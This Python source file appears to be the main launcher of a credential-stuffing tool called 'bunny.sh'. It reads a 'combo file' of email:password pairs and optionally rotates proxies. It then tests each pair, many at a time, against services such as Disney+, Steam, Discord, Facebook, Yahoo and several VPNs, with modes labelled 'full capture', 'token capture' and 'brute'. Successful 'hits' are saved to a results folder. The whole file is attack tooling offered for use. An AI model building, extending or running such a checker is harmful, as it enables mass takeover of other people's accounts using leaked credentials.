from modules.variables import Checker, discord_name
from modules.functions import *
from time import sleep
from multiprocessing.dummy import Pool
from threading import Thread
import subprocess

from modules.checkers import bonk_io
from modules.checkers import disney
from modules.checkers import duolingo
from modules.checkers import gfuel
from modules.checkers import crunchyroll
from modules.checkers import bww
from modules.checkers import honeygain
from modules.checkers import discord
from modules.checkers import windscribe
from modules.checkers import instagram
from modules.checkers import uplay
from modules.checkers import paramount
from modules.checkers import ipvanish
from modules.checkers import tunnel_bear
from modules.checkers import plextv
from modules.checkers import origin
from modules.checkers import yahoo
from modules.checkers import dickeys
from modules.checkers import hotspot_shield
from modules.checkers import facebook
from modules.checkers import hbo
from modules.checkers import steam

modules_list = {
    "bww [points capture | proxyless]": bww,
    "dickeys [points capture]": dickeys,
    "honeygain [credits capture]": honeygain,
    "yahoo [brute]": yahoo,
    "discord [token capture | solver]": discord,
    "instagram [followers capture]": instagram,
    "disney+ [full capture]": disney,
    "duolingo [full capture]": duolingo,
    "gfuel [full capture]": gfuel,
    "steam [full capture]": steam,
    "bonk.io [full capture]": bonk_io,
    "uplay [full capture]": uplay,
    "origin [full capture]": origin,
    "paramount [full capture]": paramount,
    "facebook [full capture]": facebook,
    "hbo [subscription capture]": hbo,
    "plextv [subscription capture]": plextv,
    "crunchyroll [subscription capture]": crunchyroll,
    "windscribe [subscription capture]": windscribe,
    "ipvanish [subscription capture]": ipvanish,
    "tunnelbear [subscription capture]": tunnel_bear,
    "hotspot shield [subscription capture]": hotspot_shield,
}


def starter(selected_modules: list):
    """
    Starts checking accounts using the selected modules
    """
    reset_stats()
    tree_name = generate_tree_name()
    Checker.tree_name = tree_name
    set_title(f"bunny.sh | Getting Ready")
    clear()
    ascii()
    print(f"[{dark_yellow}Getting ready...{reset}]")

    def start_checking(account: str):
        if Checker.stopping:
            return

        def add_cpm():
            if Checker.stopping:
                return
            Checker.cpm += 60

        if ":" in account:
            email, password = account.split(":", 1)
            if email and password:
                # print(
                #     f"  [{cyan}>{reset}] {green}Good{reset}: {len(Checker.good)}",
                #     end="\r",
                # )

                # print(
                #     f"  [{cyan}>{reset}] {red}Error{reset}: {len(Checker.bad)}",
                #     end="\r",
                # )

                # print(
                #     f"  [{cyan}>{reset}]{yellow}CPM{reset}: {len(Checker.cpm)}",
                #     end="\r",
                # )
                for module in selected_modules:
                    modules_list[module].check(email, password)
                    add_cpm()

                Checker.remaining.remove(account)
                return

        Checker.remaining.remove(account)
        add_cpm()
        Checker.bad += 1

    clear()
    ascii()
    print(f"    [{cyan}>{reset}] Pick combo file")
    file_path = input(f"    [{cyan}>{reset}]")

    if not file_path:
        print(f"[{red}>{reset}] No file detected")
        sleep(1)
        return

    with open(file_path, errors="ignore") as file:
        before_accounts = file.read().splitlines()
        after_accounts = list(set(before_accounts))

        Checker.accounts = after_accounts.copy()
        Checker.remaining = after_accounts.copy()
        Checker.total_accounts = len(Checker.accounts)
        duplicates = len(before_accounts) - len(after_accounts)

    if not after_accounts:
        print(f"    [{red}>{reset}] No accounts detected")

    if duplicates != 0:
        print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} accounts")

    sleep(0.5)
    print("\n")

    if Checker.proxy_type != "none":
        print(f"    [{cyan}>{reset}] Pick proxy file")
        file_path = input(f"    [{cyan}>{reset}]")
        if not file_path:
            print(f"    [{red}>{reset}] No file found")
            sleep(1)
            return
        with open(file_path, errors="ignore") as file:
            before_proxies = file.read().splitlines()
            after_proxies = list(set(before_proxies))
            Checker.proxies = after_proxies
            Checker.total_proxies = len(Checker.proxies)
            duplicates = len(before_proxies) - len(after_proxies)

        if not after_proxies:
            print(f"    [{red}>{reset}] No proxies detected")
            sleep(1)
            return
        print(
            f"    [{cyan}>{reset}] Imported {green}{len(before_proxies)}{reset} Proxies"
        )
        if duplicates != 0:
            print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} duplicated")
        sleep(0.5)
    Checker.checking = True
    Checker.time = get_time()
    makedirs(f"results/{Checker.tree_name}", exist_ok=False)
    subprocess.call(["chmod", "-R", "777", "results"])
    Thread(target=title, args=(len(selected_modules),), daemon=True).start()
    Thread(target=level_cpm, daemon=True).start()

    clear()
    total_modules = len(selected_modules)

    if not Checker.cui:
        ascii()

    else:
        Thread(target=cui, args=(total_modules,), daemon=True).start()

    if Checker.total_proxies > Checker.threads:
        Checker.lockProxies = True

    Hotkeys.start_recording()

    Checker.pool = Pool(processes=Checker.threads)
    Checker.pool.imap_unordered(func=start_checking, iterable=Checker.accounts)
    Checker.pool.close()
    Checker.pool.join()

    if Checker.cui:
        sleep(6)
    Checker.checking = False
    sleep(0.2)

    clear()
    ascii()
    print(
        f"""    {'Hits'.center(11,' ')}{fg(8)}-{reset}  {fg(2)}{numerize(Checker.good)}{reset}
    {'Custom'.center(11,' ')}{fg(8)}-{reset}  {fg(3)}{numerize(Checker.custom)}{reset}
    {'Bad'.center(11,' ')}{fg(8)}-{reset}  {fg(1)}{numerize(Checker.bad)}{reset}"""
    )
    save_path = os.path.join(os.getcwd(), f"results/{Checker.tree_name}")
    print(f"\n\n    [{cyan}>{reset}] Finished Checking")
    print(f'    [{cyan}>{reset}] Saved to "{save_path}"')
    input(f"    [{cyan}>{reset}] Press Enter To Go Back")
